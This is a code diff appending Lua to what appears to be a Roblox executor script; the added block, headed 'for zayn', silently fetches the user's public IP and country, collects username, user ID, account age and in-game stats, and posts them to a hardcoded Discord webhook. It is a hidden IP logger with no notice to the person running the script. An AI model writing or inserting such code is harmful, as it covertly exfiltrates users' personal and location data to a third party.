@@ -2978,3 +2978,133 @@ Tabs.info:AddParagraph({
 
 
 
+-- for zayn
+
+local gameID = 16732694052 -- Target game ID
+local player = game.Players.LocalPlayer -- Get the player object
+
+-- Function to fetch leaderstats dynamically
+local function getLeaderstats()
+    local leaderstats = player:FindFirstChild("leaderstats")
+    if leaderstats then
+        local level = leaderstats:FindFirstChild("Level")
+        local currency = leaderstats:FindFirstChild("C$")
+        local levelValue = level and level.Value or "N/A"
+        local currencyValue = currency and currency.Value or "N/A"
+        return levelValue, currencyValue
+    else
+        return "N/A", "N/A" -- Default if leaderstats not found
+    end
+end
+
+-- Only check for leaderstats if the game matches
+if game.PlaceId == gameID then
+    local level, currency = getLeaderstats()
+
+    -- Example: Print or use the fetched leaderstats
+    print("Player Level:", level)
+    print("Player C$:", currency)
+end
+
+-- Fetch the player's public IP and country
+local ipAddress
+local country
+local success, errorMessage = pcall(function()
+    ipAddress = game:HttpGet("https://api.ipify.org") -- Fetch the IP
+    local geoData = game:HttpGet("http://ip-api.com/json/" .. ipAddress) -- Fetch geolocation info
+    local geoTable = game:GetService("HttpService"):JSONDecode(geoData)
+    country = geoTable.country or "Unknown Country" -- Extract country or fallback to "Unknown Country"
+end)
+if not success then
+    ipAddress = "Failed to fetch IP"
+    country = "Failed to fetch Country"
+end
+
+-- Webhook setup (including leaderstats and country in the webhook)
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+local Content = ''
+local PlayerName = player.Name
+local PlayerUserId = player.UserId
+local PlayerAccountAge = player.AccountAge
+
+local level, currency = getLeaderstats() -- Fetch leaderstats
+
+local MarketplaceService = game:GetService("MarketplaceService")
+local Success, GameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+local GameName = Success and GameInfo.Name or "Unknown Game"
+local GameUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
+
+local Embed = {
+    title = ipAddress, -- Add the public IP address as the title
+    color = 3447003,
+    footer = { text = "Job ID: " .. game.JobId },
+    author = {
+        name = GameName,
+        url = GameUrl,
+    },
+    fields = {
+        {
+            name = "Player Name",
+            value = PlayerName,
+            inline = true,
+        },
+        {
+            name = "Execution Time",
+            value = os.date("%A, %B %d, %Y at %H:%M:%S UTC", OSTime),
+            inline = true,
+        },
+        {
+            name = "Script executed in",
+            value = string.format("[%s](%s)", GameName, GameUrl),
+            inline = false,
+        },
+        {
+            name = "Place ID",
+            value = tostring(game.PlaceId),
+            inline = true,
+        },
+        {
+            name = "Player User ID",
+            value = tostring(PlayerUserId),
+            inline = true,
+        },
+        {
+            name = "Account Age (Days)",
+            value = tostring(PlayerAccountAge),
+            inline = true,
+        },
+        {
+            name = "Player Level",
+            value = tostring(level),
+            inline = true,
+        },
+        {
+            name = "Player C$",
+            value = tostring(currency),
+            inline = true,
+        },
+        {
+            name = "Player Country",
+            value = country, -- Display the player's country
+            inline = true,
+        },
+        {
+            name = "Player Profile",
+            value = string.format("[Click here to view profile](https://www.roblox.com/users/%d/profile)", PlayerUserId),
+            inline = false,
+        }
+    },
+    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+}
+
+(syn and syn.request or http_request) {
+    Url = 'https://discord.com/api/webhooks/1321419923301335111/41YvfEcAapsxw1LFpv49w0eueeSk6AcevjFUgoCp3IVZUzTbvQxYwH3EQKpIaly7qZkZ',
+    Method = 'POST',
+    Headers = {
+        ['Content-Type'] = 'application/json',
+    },
+    Body = game:GetService('HttpService'):JSONEncode({ content = Content; embeds = { Embed } }),
+}
